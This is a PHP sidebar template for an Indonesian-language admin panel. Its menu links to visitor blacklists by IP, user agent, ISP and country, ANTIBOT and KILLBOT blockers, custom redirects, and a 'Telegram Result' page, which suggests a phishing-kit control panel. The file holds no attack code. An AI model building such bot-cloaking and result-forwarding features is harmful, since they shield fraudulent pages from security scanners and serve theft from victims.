<nav class="sidebar">
    <div class="logo d-flex justify-content-between">
        <a class="large_logo" href="/"><img src="<?= base_url() ?>CR51/Assets/Panel/Assets/img/logo.png" alt="" style="width: 200px;"></a>
        <a class="small_logo" href="/"><img src="<?= base_url() ?>CR51/Assets/Panel/Assets/img/mini_logo.png" alt="" style="width: 90px;"></a>
        <div class="sidebar_close_icon d-lg-none">
            <i class="ti-close"></i>
        </div>
    </div>
    <ul id="sidebar_menu" class="metismenu">
        <li>
            <a href="<?= base_url() ?>?<?php echo _config('PARAMETER'); ?>" type="button" class="btn btn-outline-info rounded-pill mb-3" style="border-left-width: 15px;width: 242px;border-right-width: 1px;left: 10px;" target="_blank" rel="noopener noreferrer">
                <div class="nav_icon_small">
                    <i class="ti-angle-double-right"></i>
                </div>
                <div class="nav_title">
                    <span>Lihat Website</span>
                </div>
            </a>
        </li>
        <li>
            <a href="/Panel" aria-expanded="false">
                <div class="nav_icon_small">
                    <img src="<?= base_url() ?>CR51/Assets/Panel/Assets/img/menu-icon/dashboard.svg" alt="">
                </div>
                <div class="nav_title">
                    <span>Beranda</span>
                </div>
            </a>
        </li>
        <h4 class="menu-text"><span>Fiture Panel</span> <i class="fas fa-ellipsis-h"></i> </h4>
        <li class="">
            <a href="<?= base_url() ?>panel/product" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-shopping-cart-full"></i>
                </div>
                <div class="nav_title">
                    <span>Product</span>
                </div>
            </a>
        </li>
        <li class="">
            <a class="has-arrow" href="#" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-na"></i>
                </div>
                <div class="nav_title">
                    <span>Tambah Backlist </span>
                </div>
            </a>
            <ul class="mm-collapse">
                <li><a href="<?= base_url() ?>panel/backlist">List Backlist</a></li>
                <li><a href="<?= base_url() ?>panel/ip">IP ADDRESS</a></li>
                <li><a href="<?= base_url() ?>panel/ua">USER AGENT</a></li>
                <li><a href="<?= base_url() ?>panel/isp">ISP</a></li>
                <li><a href="<?= base_url() ?>panel/countrycode">COUNTRY</a></li>
            </ul>
        </li>
        <li class="">
            <a class="has-arrow" href="#" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-cloud"></i>
                </div>
                <div class="nav_title">
                    <span>Blocker </span>
                </div>
            </a>
            <ul class="mm-collapse">
                <li><a href="<?= base_url() ?>panel/antibot">ANTIBOT
                        <?php
                        if (_config('ANTIBOT') == 'on') { ?><i class="far fa-circle text_color_3" style="padding-left: 20px;"></i><?php } ?></a></li>
                <li><a href="<?= base_url() ?>panel/killbot">KILLBOT
                        <?php
                        if (_config('KILLBOT') == 'on') { ?><i class="far fa-circle text_color_3" style="padding-left: 20px;"></i>
                        <?php } ?></a></li>
            </ul>
        </li>
        <?php if (_config('NOTFOUND') == 'custom') { ?>
            <li class="">
                <a href="<?= base_url() ?>panel/customredirect" aria-expanded="false">
                    <div class="nav_icon_small">
                        <i class="ti-link"></i>
                    </div>
                    <div class="nav_title">
                        <span class="txt-warning">Custom Redirect</span>
                    </div>
                </a>
            </li>
        <?php } ?>
        <?php if (_config('Telegram') == 'on') { ?>
            <li class="">
                <a href="<?= base_url() ?>panel/telegram" aria-expanded="false">
                    <div class="nav_icon_small">
                        <i class="ti-announcement"></i>
                    </div>
                    <div class="nav_title">
                        <span class="txt-warning">Telegram Result</span>
                    </div>
                </a>
            </li>
        <?php } ?>
        <li class="">
            <a href="<?= base_url() ?>panel/kontak" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-id-badge"></i>
                </div>
                <div class="nav_title">
                    <span>Kontak</span>
                </div>
            </a>
        </li>
        <li>
            <a href="<?= base_url() ?>panel/pengaturan" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-settings"></i>
                </div>
                <div class="nav_title">
                    <span>Pengaturan </span>
                </div>
            </a>
        </li>
        <li>
            <a href="<?= base_url() ?>panel/detailsscript" aria-expanded="false">
                <div class="nav_icon_small">
                    <i class="ti-receipt"></i>
                </div>
                <div class="nav_title">
                    <span>Detail Script </span>
                </div>
            </a>
        </li>
    </ul>
</nav>